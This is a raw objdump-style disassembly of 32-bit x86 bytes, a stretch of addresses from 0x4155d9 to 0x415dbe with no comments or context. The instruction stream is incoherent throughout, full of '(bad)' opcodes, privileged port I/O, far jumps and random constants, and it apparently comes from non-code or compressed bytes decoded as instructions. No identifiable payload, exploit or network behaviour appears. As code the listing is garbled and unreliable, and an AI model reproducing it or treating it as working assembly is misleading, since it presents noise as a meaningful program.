  4155d9:	inc    esp
  4155da:	lea    esp,[ebp+0xce06137]
  4155e0:	sbb    esp,DWORD PTR [edi+0x9]
  4155e3:	add    eax,0x3302f99b
  4155e8:	sbb    edi,DWORD PTR [ebx-0x2e277b16]
  4155ee:	pop    es
  4155ef:	cmp    al,0xa3
  4155f1:	mov    eax,ds:0x9f46b635
  4155f6:	jle    0x4155a2
  4155f8:	cmc    
  4155f9:	inc    eax
  4155fa:	test   BYTE PTR [esi+edx*1-0x65],dl
  4155fe:	and    ecx,DWORD PTR [esi+0x42]
  415601:	popa   
  415602:	out    dx,eax
  415603:	leave  
  415604:	cmp    edi,DWORD PTR [eax-0x11]
  415607:	idiv   cl
  415609:	fcmovu st,st(7)
  41560b:	or     BYTE PTR [ebx+0x7a98342e],ah
  415611:	ror    DWORD PTR [ecx],1
  415613:	cmp    bl,ch
  415615:	or     DWORD PTR [edx+ebp*1],0xffffff84
  415619:	(bad)  
  41561a:	ror    BYTE PTR [edi],cl
  41561c:	ret    0xa18b
  41561f:	inc    edi
  415620:	adc    al,0x15
  415622:	mov    al,ds:0xdecc1cdc
  415627:	rcl    edx,cl
  415629:	sahf   
  41562a:	pop    esi
  41562b:	inc    edi
  41562c:	jae    0x415671
  41562e:	ror    BYTE PTR [eax+0x48],1
  415631:	and    eax,0xca97315a
  415636:	adc    eax,0x33460826
  41563b:	and    DWORD PTR ds:0x9c4125be,esi
  415641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415642:	enter  0xba1a,0xdf
  415646:	push   0x21
  415648:	bound  eax,QWORD PTR [edi-0x36]
  41564b:	jnp    0x415691
  41564d:	xchg   BYTE PTR [edx+ebx*4],ah
  415650:	and    BYTE PTR [esi],0x73
  415653:	enter  0x8062,0xa
  415657:	jnp    0x4156b5
  415659:	sub    eax,0xb8481c9c
  41565e:	mov    esi,0x46cde7d4
  415663:	push   0x13299b3c
  415668:	fsubr  st(6),st
  41566a:	rol    DWORD PTR [edi-0x7e2a2a80],1
  415670:	adc    dl,BYTE PTR ds:0x119d57c4
  415676:	nop
  415677:	leave  
  415678:	inc    ebp
  415679:	add    al,0x17
  41567b:	aam    0x71
  41567d:	je     0x41567a
  41567f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415680:	push   ecx
  415681:	push   ds
  415682:	inc    esp
  415683:	nop
  415684:	mov    ch,0x85
  415686:	scas   al,BYTE PTR es:[edi]
  415687:	fist   WORD PTR [ebx+0x1af03b18]
  41568d:	xor    dh,0x15
  415690:	outs   dx,DWORD PTR ds:[esi]
  415691:	ins    BYTE PTR es:[edi],dx
  415692:	int    0x8c
  415694:	ret    0x7733
  415697:	ja     0x4156a5
  415699:	jns    0x415622
  41569b:	xor    DWORD PTR [edi-0x24],esi
  41569e:	call   0x8bcd0842
  4156a3:	and    al,0xd0
  4156a5:	sbb    BYTE PTR [edx+0x35],0x5e
  4156a9:	dec    edi
  4156aa:	jbe    0x4156e8
  4156ac:	fdivr  DWORD PTR [edi+0x54]
  4156af:	push   cs
  4156b0:	(bad)  
  4156b1:	add    al,0xca
  4156b3:	push   ebp
  4156b4:	(bad)  
  4156b5:	and    BYTE PTR [ecx-0x7d],bl
  4156b8:	leave  
  4156b9:	addr16 pop esi
  4156bb:	leave  
  4156bc:	in     al,dx
  4156bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156be:	retf   
  4156bf:	test   eax,0x1a0e4374
  4156c4:	in     eax,0xce
  4156c6:	sub    al,0x5b
  4156c8:	stos   BYTE PTR es:[edi],al
  4156c9:	dec    esp
  4156ca:	xchg   edi,eax
  4156cb:	(bad)  
  4156cc:	int    0xa9
  4156ce:	or     ecx,ebx
  4156d0:	out    dx,eax
  4156d1:	or     DWORD PTR [edx],0xffffff9a
  4156d4:	ror    BYTE PTR [ecx],1
  4156d6:	and    al,0xe3
  4156d8:	popa   
  4156d9:	stos   BYTE PTR es:[edi],al
  4156da:	pop    eax
  4156db:	pop    ss
  4156dc:	arpl   bp,di
  4156de:	dec    ebp
  4156df:	into   
  4156e0:	int3   
  4156e1:	adc    eax,0xf92e3451
  4156e6:	call   0x96472a5a
  4156eb:	fmul   DWORD PTR [ecx]
  4156ed:	cmp    ebx,ebx
  4156ef:	fs jle 0x415744
  4156f2:	sti    
  4156f3:	clc    
  4156f4:	push   ebx
  4156f5:	out    dx,al
  4156f6:	ja     0x415760
  4156f8:	xchg   ebx,eax
  4156f9:	(bad)  
  4156fa:	sti    
  4156fb:	hlt    
  4156fc:	in     eax,0xdf
  4156fe:	mov    ebx,0x61e3085
  415703:	(bad)  
  415704:	retf   
  415705:	retf   
  415706:	scas   al,BYTE PTR es:[edi]
  415707:	repnz mov edi,0x934c4658
  41570d:	ds jbe 0x4156ec
  415710:	in     al,0x9c
  415712:	push   ds
  415713:	pushf  
  415714:	or     al,0xc3
  415716:	and    dl,0xd3
  415719:	add    bh,BYTE PTR [edi]
  41571b:	xor    eax,0x9c7c875e
  415720:	test   DWORD PTR [ebx+0x5024dbeb],0xdbf0348c
  41572a:	jge    0x415771
  41572c:	add    DWORD PTR [edi+0x34c6b2c7],edx
  415732:	mov    ds:0xa50056d6,eax
  415737:	in     al,dx
  415738:	icebp  
  415739:	inc    esp
  41573a:	loopne 0x4156d7
  41573c:	inc    ecx
  41573d:	mul    DWORD PTR [edx+esi*1+0x21]
  415741:	stos   DWORD PTR es:[edi],eax
  415742:	xor    al,0x2e
  415744:	cs retf 0xc249
  415748:	jns    0x415774
  41574a:	mov    ebx,0xc88e47d2
  41574f:	push   edx
  415750:	in     eax,dx
  415751:	shl    DWORD PTR [eax+0x6baa23e2],1
  415757:	or     BYTE PTR [ecx+eax*2-0x8],cl
  41575b:	arpl   bp,ax
  41575d:	pop    eax
  41575e:	fisttp QWORD PTR [eax]
  415760:	xor    BYTE PTR [ebx+0x60f6934d],0xb2
  415767:	inc    eax
  415768:	rcr    BYTE PTR cs:[ebx+0x11],cl
  41576c:	push   ss
  41576d:	or     dl,BYTE PTR [esi]
  41576f:	ds (bad) 
  415771:	loopne 0x415741
  415773:	mov    WORD PTR [esi+eiz*2+0x4e],ss
  415777:	inc    esp
  415778:	sbb    eax,0xc832951c
  41577d:	inc    ebp
  41577e:	in     eax,0x6f
  415780:	stc    
  415781:	inc    edx
  415782:	xchg   ebx,eax
  415783:	fbld   TBYTE PTR ds:0x5f7114ae
  415789:	rol    BYTE PTR [edi-0x9],0xee
  41578d:	adc    BYTE PTR [edx+0x24f4909b],bh
  415793:	add    eax,0x7853f440
  415798:	xchg   ebx,eax
  415799:	cmp    esi,eax
  41579b:	mov    ebx,0x6df8b15d
  4157a0:	loop   0x41573a
  4157a2:	mov    al,ds:0xc20426ca
  4157a7:	ret    0xdf3b
  4157aa:	jge    0x41576f
  4157ac:	cmp    eax,0x2124a433
  4157b1:	cwde   
  4157b2:	and    esp,DWORD PTR [esi+0x32e69444]
  4157b8:	into   
  4157b9:	(bad)  
  4157ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157bb:	sub    DWORD PTR [edx-0x6574a844],edi
  4157c1:	jnp    0x4157bb
  4157c3:	dec    edx
  4157c4:	mov    bl,0x2a
  4157c6:	jp     0x4157a1
  4157c8:	(bad)  
  4157c9:	ja     0x415838
  4157cb:	nop
  4157cc:	mov    esi,0xbbda7970
  4157d1:	dec    edi
  4157d2:	pusha  
  4157d3:	inc    al
  4157d5:	mov    ch,0xfa
  4157d7:	mov    ecx,0x8665f6e8
  4157dc:	into   
  4157dd:	loopne 0x4157e5
  4157df:	add    al,0x79
  4157e1:	fsub   DWORD PTR [ebp+edx*2+0x329ba1d9]
  4157e9:	inc    ecx
  4157ea:	scas   eax,DWORD PTR es:[edi]
  4157eb:	mov    esp,0xf3b6fd5d
  4157f0:	punpckhwd mm2,mm5
  4157f3:	pop    es
  4157f4:	mov    al,0x66
  4157f6:	aas    
  4157f7:	dec    esp
  4157f8:	jnp    0x4157fb
  4157fa:	add    bl,bh
  4157fc:	jno    0x415857
  4157fe:	rol    BYTE PTR [ebp+0x4ea4d26f],0x7b
  415805:	sub    bh,cl
  415807:	popf   
  415808:	(bad)  
  415809:	out    dx,eax
  41580a:	mov    ebp,0x5a634fd4
  41580f:	test   DWORD PTR [eax+0x61],ecx
  415812:	in     al,dx
  415813:	ins    DWORD PTR es:[edi],dx
  415814:	or     cl,BYTE PTR [edx-0x2bb71620]
  41581a:	inc    esi
  41581b:	(bad)  
  41581c:	xchg   ebp,eax
  41581d:	stc    
  41581e:	fisttp QWORD PTR [edi+ebp*8-0x1077d2aa]
  415825:	inc    ecx
  415826:	fucomp st(3)
  415828:	mov    esi,0x36259a62
  41582d:	imul   ebp,DWORD PTR [edi-0x6],0x8e247d6a
  415834:	retf   0x102
  415837:	mov    ch,0x70
  415839:	jb     0x415859
  41583b:	lahf   
  41583c:	mov    al,0xd8
  41583e:	(bad)  
  41583f:	sbb    BYTE PTR ds:0x63a8aa41,ah
  415845:	mov    cl,0x79
  415847:	push   ss
  415848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415849:	cmp    eax,0x4744d9ee
  41584e:	jbe    0x415842
  415850:	(bad)  [edx-0xa]
  415853:	dec    edi
  415854:	fidiv  DWORD PTR [ecx]
  415856:	mov    ecx,0x9c4c8d7e
  41585b:	adc    eax,0x54d4245
  415860:	jo     0x4157e5
  415862:	jmp    0x415841
  415864:	bound  esi,QWORD PTR [ebx+ecx*1]
  415867:	out    dx,eax
  415868:	rcl    edi,1
  41586a:	retf   0x5fba
  41586d:	push   edi
  41586e:	(bad)  
  415870:	xor    ecx,ecx
  415872:	inc    edx
  415873:	aad    0xb0
  415875:	sub    DWORD PTR [ebx-0x42],esp
  415878:	jp     0x415830
  41587a:	sbb    edi,esp
  41587c:	dec    eax
  41587d:	out    dx,al
  41587e:	(bad)  
  41587f:	xlat   BYTE PTR ds:[ebx]
  415880:	mov    esp,0x9ffa6305
  415885:	stos   BYTE PTR es:[edi],al
  415886:	mov    gs:0x6ab89979,al
  41588c:	ret    
  41588d:	cmc    
  41588e:	pop    ebp
  41588f:	add    edx,DWORD PTR [edx-0x7dba353b]
  415895:	fidivr WORD PTR [edx+eax*2]
  415898:	sbb    al,0x77
  41589a:	test   BYTE PTR [edi+eax*4+0x63],ah
  41589e:	or     ecx,ebp
  4158a0:	iret   
  4158a1:	pushw  ss
  4158a3:	xor    al,0x5d
  4158a5:	and    bh,BYTE PTR [ecx+0x62fbfb71]
  4158ab:	jg     0x4158ce
  4158ad:	pop    ecx
  4158ae:	std    
  4158af:	xor    al,0xd1
  4158b1:	sub    eax,0xefdab6b9
  4158b6:	and    edx,DWORD PTR [ebx+0x4d]
  4158b9:	inc    eax
  4158ba:	xchg   ch,al
  4158bc:	imul   esi,edx,0xffffff87
  4158bf:	dec    eax
  4158c0:	cs cs adc eax,0xd8233c3a
  4158c7:	xchg   BYTE PTR [ecx-0x76],al
  4158ca:	out    0xad,eax
  4158cc:	ret    
  4158cd:	neg    BYTE PTR [edx+0x1e]
  4158d0:	lahf   
  4158d1:	xor    al,0xff
  4158d3:	mov    ecx,0x7d58518
  4158d8:	lods   eax,DWORD PTR ds:[esi]
  4158d9:	into   
  4158da:	out    dx,eax
  4158db:	jp     0x415906
  4158dd:	test   ebx,esi
  4158df:	jg     0x415902
  4158e1:	loope  0x415890
  4158e3:	pop    es
  4158e4:	cwde   
  4158e5:	sar    DWORD PTR [eax],1
  4158e7:	and    eax,0xe2df1543
  4158ec:	dec    ebx
  4158ed:	pop    edi
  4158ee:	pcmpeqw mm2,QWORD PTR [edi+ebx*1-0x7d]
  4158f3:	dec    esp
  4158f4:	popa   
  4158f5:	or     ebx,ecx
  4158f7:	mov    al,ds:0x24e71ee5
  4158fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158fd:	and    edi,DWORD PTR [eax+0x5d1da76]
  415903:	jns    0x4158a9
  415905:	(bad)  
  415907:	xlat   BYTE PTR ds:[ebx]
  415908:	xchg   bh,ah
  41590a:	dec    ebx
  41590b:	sbb    DWORD PTR [ebx],edx
  41590d:	test   BYTE PTR [eax-0x70],cl
  415910:	imul   edi,esi,0xd96cd1f1
  415916:	or     esp,ecx
  415918:	idiv   esi
  41591a:	rcr    DWORD PTR [ecx-0x6132dbfb],cl
  415920:	loope  0x4158d6
  415922:	ins    BYTE PTR es:[edi],dx
  415923:	xchg   ebp,eax
  415924:	inc    eax
  415925:	imul   esp,DWORD PTR [edx],0xffffffb1
  415928:	xor    al,0x51
  41592a:	mov    fs,WORD PTR [ebp-0x779fcbd1]
  415930:	jae    0x415926
  415932:	ja     0x415927
  415934:	call   0x12cc:0x76817690
  41593b:	rcr    ah,1
  41593d:	daa    
  41593e:	pop    edx
  41593f:	into   
  415940:	mov    esi,0x570eff19
  415945:	inc    ebx
  415946:	je     0x415930
  415948:	cs jge 0x41599a
  41594b:	(bad)  
  41594c:	(bad)  [edi-0x16]
  41594f:	pop    ebx
  415950:	pop    edx
  415951:	mov    ds:0xb1630c32,eax
  415956:	daa    
  415957:	inc    ecx
  415958:	jmp    0xcc0204ae
  41595d:	xor    dh,BYTE PTR [eax-0x74]
  415960:	in     al,0xac
  415962:	xor    esp,DWORD PTR [edi-0x24a5e57f]
  415968:	out    dx,al
  415969:	ds add al,0xa5
  41596c:	sbb    cl,BYTE PTR cs:[ebp+0x638746aa]
  415973:	iret   
  415974:	and    DWORD PTR [ecx-0x57128ae7],ebx
  41597a:	fstp   TBYTE PTR [esi+0x7374e50a]
  415980:	mov    esi,esp
  415982:	adc    BYTE PTR [edi],dl
  415984:	add    dl,BYTE PTR [ebp-0x48fb9a87]
  41598a:	in     eax,dx
  41598b:	and    eax,0xe6e87065
  415990:	jl     0x41594a
  415992:	adc    al,0xec
  415994:	pop    ss
  415995:	sub    dh,bl
  415997:	cdq    
  415998:	outs   dx,DWORD PTR ds:[esi]
  415999:	sub    al,al
  41599b:	fsubr  st,st(1)
  41599d:	push   eax
  41599e:	or     ebx,DWORD PTR [ecx-0x293cd511]
  4159a4:	retf   
  4159a5:	scas   al,BYTE PTR es:[edi]
  4159a6:	jno    0x415a08
  4159a8:	js     0x415952
  4159aa:	sub    dl,ch
  4159ac:	scas   al,BYTE PTR es:[edi]
  4159ad:	mov    edx,0xeb61fb61
  4159b2:	jne    0x41593f
  4159b4:	call   DWORD PTR [esp+eax*2]
  4159b7:	inc    esi
  4159b8:	in     al,dx
  4159b9:	ficomp DWORD PTR [eax+0x6f85d361]
  4159bf:	je     0x415a15
  4159c1:	scas   eax,DWORD PTR es:[edi]
  4159c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159c3:	jno    0x415948
  4159c5:	in     eax,0x52
  4159c7:	mov    DWORD PTR [ebx],esp
  4159c9:	xor    eax,0xfc4da876
  4159ce:	fmul   QWORD PTR [edi-0x63]
  4159d1:	stc    
  4159d2:	setae  dl
  4159d5:	xor    BYTE PTR [ecx],ch
  4159d7:	ret    
  4159d8:	mov    ebx,0x96c8088f
  4159dd:	retf   0x7d76
  4159e0:	push   es
  4159e1:	cli    
  4159e2:	mov    ds:0x6b29d467,al
  4159e7:	adc    esp,0x5fdc5094
  4159ed:	lea    esp,[ebx+0x4]
  4159f0:	mov    ds:0xba5639a2,al
  4159f5:	or     al,0x44
  4159f7:	arpl   sp,bx
  4159f9:	jae    0x4159f2
  4159fb:	jbe    0x415984
  4159fd:	push   0x7c
  4159ff:	xchg   edx,eax
  415a00:	test   eax,0x1a9d6198
  415a05:	jge    0x415a38
  415a07:	push   eax
  415a08:	sub    eax,0x1621f0e8
  415a0d:	test   BYTE PTR [edx+0x14],dl
  415a10:	mov    al,0x43
  415a12:	int3   
  415a13:	mov    ah,0x6e
  415a15:	and    esp,DWORD PTR [edx]
  415a17:	pop    edi
  415a18:	pushf  
  415a19:	xchg   DWORD PTR [esp+eiz*2-0x36],esi
  415a1d:	shl    ebx,1
  415a1f:	aam    0xf5
  415a21:	jg     0x415a52
  415a23:	or     al,0x58
  415a25:	ja     0x415a81
  415a27:	mov    edx,DWORD PTR [edi+eax*2+0x6696b045]
  415a2e:	xlat   BYTE PTR ds:[ebx]
  415a2f:	test   DWORD PTR [ebp-0x6f2ecc9c],0x5defbaad
  415a39:	clc    
  415a3a:	test   al,0x2c
  415a3c:	cld    
  415a3d:	or     ecx,edx
  415a3f:	addr16 mov al,0xde
  415a42:	push   edi
  415a43:	imul   ebp,DWORD PTR [edx],0xe9c03ec3
  415a49:	push   esi
  415a4a:	mov    dh,0x30
  415a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a4d:	pop    edx
  415a4e:	aam    0xbe
  415a50:	fistp  QWORD PTR [edi]
  415a52:	inc    edx
  415a53:	mov    ah,0xf9
  415a55:	jp     0x415ace
  415a57:	ins    DWORD PTR es:[edi],dx
  415a58:	pop    ds
  415a59:	xor    eax,0x35c808fb
  415a5e:	add    DWORD PTR [esi],esp
  415a60:	(bad)  
  415a61:	shl    BYTE PTR [ebp-0x213f2e88],1
  415a67:	adc    BYTE PTR [eax+0x6c],0x1b
  415a6b:	xor    cl,BYTE PTR [ecx+0x17f192d1]
  415a71:	dec    esi
  415a72:	fwait
  415a73:	in     eax,0x8
  415a75:	push   ss
  415a76:	jecxz  0x415a58
  415a78:	loope  0x415a7b
  415a7a:	in     al,dx
  415a7b:	adc    BYTE PTR [ebp+0x50],al
  415a7e:	and    ebp,ebx
  415a80:	or     BYTE PTR [ebx+0x580dd648],bl
  415a86:	enter  0x8775,0x83
  415a8a:	sbb    dl,cl
  415a8c:	fwait
  415a8d:	xor    al,0x38
  415a8f:	adc    DWORD PTR [ebx],esp
  415a91:	inc    edx
  415a92:	call   DWORD PTR [eax]
  415a94:	out    0xbb,al
  415a96:	stos   DWORD PTR es:[edi],eax
  415a97:	mov    bh,0x4d
  415a99:	dec    edx
  415a9a:	push   es
  415a9b:	test   BYTE PTR [ecx+0x648f6e23],al
  415aa1:	repnz push edi
  415aa3:	adc    eax,0x6e66c034
  415aa8:	dec    edi
  415aa9:	and    DWORD PTR [edx+0x64],ebp
  415aac:	mov    ecx,0xac3de6d3
  415ab1:	shl    DWORD PTR [edx],0x79
  415ab4:	jmp    0x5370334e
  415ab9:	inc    esi
  415aba:	push   es
  415abb:	fnstcw WORD PTR [eax+0x3d]
  415abe:	mov    eax,0x6d30fccc
  415ac3:	pop    ds
  415ac4:	inc    eax
  415ac5:	xchg   DWORD PTR [edx-0x44c62068],esp
  415acb:	lahf   
  415acc:	cli    
  415acd:	mov    BYTE PTR [ebx+0x577b790e],dh
  415ad3:	cdq    
  415ad4:	xor    dl,BYTE PTR [ebx]
  415ad6:	jl     0x415b0d
  415ad8:	fbstp  TBYTE PTR [ecx]
  415ada:	xchg   edx,eax
  415adb:	push   eax
  415adc:	pop    ecx
  415add:	jmp    0x74041891
  415ae2:	and    eax,0x52ff137a
  415ae7:	and    esi,DWORD PTR [edx+eiz*4+0x70]
  415aeb:	inc    edi
  415aec:	mov    edx,esp
  415aee:	lahf   
  415aef:	jmp    DWORD PTR [edx+ecx*2]
  415af2:	int    0x6f
  415af4:	or     DWORD PTR [ebx-0x33],edx
  415af7:	mov    esp,0x1d64c9ac
  415afc:	cli    
  415afd:	not    BYTE PTR [ebx]
  415aff:	dec    esi
  415b00:	fild   WORD PTR [ebx-0x195a276d]
  415b06:	fistp  DWORD PTR [ebx+esi*8+0x32241fd1]
  415b0d:	fmul   st(2),st
  415b0f:	dec    ebx
  415b10:	icebp  
  415b11:	aas    
  415b12:	(bad)  
  415b13:	call   0xcf29:0xb5493929
  415b1a:	xchg   ebx,eax
  415b1b:	add    edx,eax
  415b1d:	sub    ch,bh
  415b1f:	(bad)
  415b23:	popf   
  415b24:	push   cs
  415b25:	repnz test eax,0x109c8eb6
  415b2b:	add    DWORD PTR [edx+0x3f],edi
  415b2e:	pop    eax
  415b2f:	add    eax,0xc09c16d4
  415b34:	iret   
  415b35:	cmp    BYTE PTR [ebp+0x19],dh
  415b38:	cmc    
  415b39:	push   ss
  415b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b3b:	jg     0x415aed
  415b3d:	fdivrp st(6),st
  415b3f:	sbb    DWORD PTR [eax],esp
  415b41:	out    0xa7,al
  415b43:	fld    QWORD PTR [ebp+eiz*2-0x26]
  415b47:	adc    BYTE PTR [ecx-0x21],ch
  415b4a:	scas   eax,DWORD PTR es:[edi]
  415b4b:	int    0x30
  415b4d:	mov    dh,0xe9
  415b4f:	shl    BYTE PTR [ebp+0x59eec142],1
  415b55:	cmp    DWORD PTR [edi-0x63b961ff],ecx
  415b5b:	call   0x98aed69d
  415b60:	dec    esp
  415b61:	(bad)  
  415b62:	lods   al,BYTE PTR ds:[esi]
  415b63:	ret    
  415b64:	or     DWORD PTR [esi+0x4f],edx
  415b67:	xor    ah,0x43
  415b6a:	sub    DWORD PTR [esi],edi
  415b6c:	sbb    eax,0x9f7f582d
  415b71:	mov    ecx,0xde842235
  415b76:	cmp    BYTE PTR [eax],bh
  415b78:	data16 mov BYTE PTR [eax],al
  415b7b:	mov    ebp,0xd16065e3
  415b80:	push   0xa0f21ab5
  415b85:	and    ebp,0x1435a6f6
  415b8b:	test   eax,0x6f211826
  415b90:	xlat   BYTE PTR ds:[ebx]
  415b91:	test   al,0xde
  415b93:	mov    ds:0xf5b680e1,al
  415b98:	jmp    0xb38e368c
  415b9d:	imul   DWORD PTR ss:[esi]
  415ba0:	mov    esp,0xf84fdbf
  415ba5:	dec    ebp
  415ba6:	or     al,0xe
  415ba8:	test   al,dl
  415baa:	inc    esp
  415bab:	jae    0x415b4b
  415bad:	cmp    bh,bl
  415baf:	fsub   st,st(3)
  415bb1:	leave  
  415bb2:	mov    edx,0x213eca37
  415bb7:	mov    dl,0x41
  415bb9:	sahf   
  415bba:	and    dh,BYTE PTR [edi-0x2df91ef3]
  415bc0:	xchg   esp,eax
  415bc1:	dec    ebp
  415bc2:	ss xchg esp,eax
  415bc4:	jbe    0x415b70
  415bc6:	and    ebx,edx
  415bc8:	inc    esp
  415bc9:	sbb    cl,bh
  415bcb:	popf   
  415bcc:	pop    ecx
  415bcd:	lahf   
  415bce:	out    0x8a,eax
  415bd0:	hlt    
  415bd1:	shr    DWORD PTR [edi-0x18b498cc],cl
  415bd7:	fadd   st(5),st
  415bd9:	popa   
  415bda:	adc    cl,0xa4
  415bdd:	(bad)  
  415bde:	outs   dx,DWORD PTR ds:[esi]
  415bdf:	sbb    ecx,DWORD PTR [ebp-0x37]
  415be2:	cs push es
  415be4:	nop
  415be5:	into   
  415be6:	pop    eax
  415be7:	add    al,0x6c
  415be9:	out    0x14,al
  415beb:	or     al,0x7c
  415bed:	pop    edx
  415bee:	aam    0xc
  415bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bf1:	adc    eax,0xdafac2ac
  415bf6:	sbb    eax,0xca28ab0b
  415bfb:	or     eax,0x4c0c9064
  415c00:	popa   
  415c01:	cmp    ecx,DWORD PTR [eax]
  415c03:	dec    ebx
  415c04:	inc    edi
  415c05:	xchg   ebx,eax
  415c06:	mov    DWORD PTR [esi-0x2b],ebp
  415c09:	ret    0x8b12
  415c0c:	dec    ebp
  415c0d:	push   ebp
  415c0e:	dec    ebp
  415c0f:	mov    DWORD PTR [edi],ebp
  415c11:	loopne 0x415c74
  415c13:	mov    ebx,0x278f2c04
  415c18:	out    dx,eax
  415c19:	push   edi
  415c1a:	inc    edx
  415c1b:	aas    
  415c1c:	ret    
  415c1d:	stos   DWORD PTR es:[edi],eax
  415c1e:	lds    esp,FWORD PTR [edx]
  415c20:	fwait
  415c21:	cmp    BYTE PTR [edx+0x16],ah
  415c24:	mov    esp,0x4c9f3948
  415c29:	mov    esi,0x3b9fb7c8
  415c2e:	les    esi,FWORD PTR [ecx-0x5e]
  415c31:	ins    DWORD PTR es:[edi],dx
  415c32:	out    0x69,eax
  415c34:	xor    eax,0x5aee23c9
  415c39:	jle    0x415bc1
  415c3b:	adc    eax,0x35b7f86a
  415c40:	jg     0x415c8c
  415c42:	jmp    0x7bab:0x8ea55e50
  415c49:	fcmovu st,st(7)
  415c4b:	xor    al,0x73
  415c4d:	ins    DWORD PTR es:[edi],dx
  415c4e:	xor    bl,BYTE PTR [esi+edx*4]
  415c51:	loop   0x415c11
  415c53:	jmp    0x7206:0xf95bb0ec
  415c5a:	ret    0xd8d1
  415c5d:	xor    DWORD PTR [esi+0x49],esi
  415c60:	jl     0x415c72
  415c62:	sbb    DWORD PTR [edx+edx*4+0xd],edi
  415c66:	pop    edi
  415c67:	sbb    cl,ch
  415c69:	push   edx
  415c6a:	add    DWORD PTR [edi-0x610d50be],esi
  415c70:	sbb    al,0xa4
  415c72:	cmp    BYTE PTR [ebx+0x4e],0xd6
  415c76:	pop    ebx
  415c77:	imul   esi,DWORD PTR [edi+ebp*2+0x9],0x50
  415c7c:	mov    esi,0x3aae9dda
  415c81:	inc    ebx
  415c82:	mov    edi,0x74a6bc5e
  415c87:	fldcw  WORD PTR [ebx]
  415c89:	adc    eax,DWORD PTR [edx+0x7f781184]
  415c8f:	xchg   ebx,eax
  415c90:	stos   DWORD PTR es:[edi],eax
  415c91:	in     eax,dx
  415c92:	or     BYTE PTR [edx+0x7b],0x9d
  415c96:	in     al,0x26
  415c98:	jmp    0xa7e2:0xe99871ef
  415c9f:	(bad)
  415ca2:	jb     0x415d1c
  415ca4:	xor    eax,0x638a250b
  415ca9:	sar    DWORD PTR ds:0x787cdfdd,cl
  415caf:	add    esp,DWORD PTR [edi]
  415cb1:	sahf   
  415cb2:	push   edi
  415cb3:	pop    es
  415cb4:	fwait
  415cb5:	or     eax,0x28577ed7
  415cba:	push   0x79
  415cbc:	pop    esp
  415cbd:	mov    ecx,DWORD PTR [ecx+edi*1-0x7f]
  415cc1:	mov    ds:0x62b45c,eax
  415cc6:	test   BYTE PTR [esi+0x7f],0xea
  415cca:	es in  al,dx
  415ccc:	ret    
  415ccd:	hlt    
  415cce:	lahf   
  415ccf:	sub    DWORD PTR [ecx+0x4a],ecx
  415cd2:	scas   eax,DWORD PTR es:[edi]
  415cd3:	clc    
  415cd4:	aam    0xf3
  415cd6:	cdq    
  415cd7:	fdivrp st(5),st
  415cd9:	xchg   ebp,eax
  415cda:	inc    ebx
  415cdb:	and    ebp,ebp
  415cdd:	pusha  
  415cde:	jl     0x415cc3
  415ce0:	inc    ebx
  415ce1:	jns    0x415cf6
  415ce3:	cs in  eax,dx
  415ce5:	ins    BYTE PTR es:[edi],dx
  415ce6:	into   
  415ce7:	sbb    al,0xa3
  415ce9:	push   es
  415cea:	pop    ds
  415ceb:	int3   
  415cec:	test   DWORD PTR [ecx+0x6],0xa004e521
  415cf3:	jbe    0x415d07
  415cf5:	xchg   DWORD PTR [ecx],eax
  415cf7:	call   0x74796ac4
  415cfc:	adc    ch,cl
  415cfe:	cdq    
  415cff:	ret    0x2cf0
  415d02:	adc    cl,BYTE PTR [ebx-0x61]
  415d05:	jb     0x415d4e
  415d07:	clc    
  415d08:	test   al,0xa3
  415d0a:	stos   DWORD PTR es:[edi],eax
  415d0b:	mov    esp,0x98d1ed43
  415d10:	jne    0x415d84
  415d12:	mov    ch,0x29
  415d14:	pop    eax
  415d15:	ins    DWORD PTR es:[edi],dx
  415d16:	sbb    DWORD PTR [eax+0x52621c2],0xb18aa42b
  415d20:	test   eax,0xbc2bc324
  415d25:	sahf   
  415d26:	pop    edx
  415d27:	repz sti 
  415d29:	pop    ebp
  415d2a:	jle    0x415cc7
  415d2c:	jecxz  0x415da3
  415d2e:	retf   
  415d2f:	dec    esp
  415d30:	push   0x761c0bad
  415d35:	sbb    BYTE PTR ss:[ebp-0x7ee0af24],0x4
  415d3d:	xchg   ecx,eax
  415d3e:	es ins BYTE PTR es:[edi],dx
  415d40:	das    
  415d41:	cmp    eax,0x39b6dd8e
  415d46:	adc    esi,DWORD PTR [eax]
  415d48:	iret   
  415d49:	sbb    eax,0xf109d81f
  415d4e:	push   esi
  415d4f:	push   edx
  415d50:	out    dx,al
  415d51:	inc    ebx
  415d52:	(bad)  [esi+0x6f2d626c]
  415d58:	mov    ds:0x8f62da82,eax
  415d5d:	adc    al,cl
  415d5f:	xor    BYTE PTR [edi],0x53
  415d62:	add    BYTE PTR [edx-0x42f73a16],bl
  415d68:	iret   
  415d69:	push   edi
  415d6a:	nop    DWORD PTR [ebx+0x2381be0d]
  415d71:	nop
  415d72:	stc    
  415d73:	jo     0x415de8
  415d75:	iret   
  415d76:	push   0xe
  415d78:	test   eax,0x9b359d34
  415d7d:	jo     0x415dba
  415d7f:	fst    st(3)
  415d81:	sti    
  415d82:	pop    ebx
  415d83:	js     0x415dc0
  415d85:	das    
  415d86:	sbb    ebp,esp
  415d88:	push   ebp
  415d89:	js     0x415d66
  415d8b:	and    BYTE PTR [esi+0xed05cbf],bh
  415d91:	test   al,0xac
  415d93:	in     eax,0x53
  415d95:	ret    0x23b2
  415d98:	outs   dx,DWORD PTR cs:[esi]
  415d9a:	jnp    0x415dca
  415d9c:	jno    0x415e1a
  415d9e:	lds    esp,FWORD PTR [eax]
  415da0:	dec    edx
  415da1:	movzx  ebx,dh
  415da4:	xor    DWORD PTR cs:0xbb0138cc,ebx
  415dab:	pop    esi
  415dac:	(bad)  
  415dad:	mov    eax,DWORD PTR [ecx+0x43]
  415db0:	(bad)
  415db3:	scas   eax,DWORD PTR es:[edi]
  415db4:	pop    ecx
  415db5:	jno    0x415d7d
  415db7:	sar    BYTE PTR [eax-0x7e3d80a9],0x68
  415dbe:	mov    ah,0x66
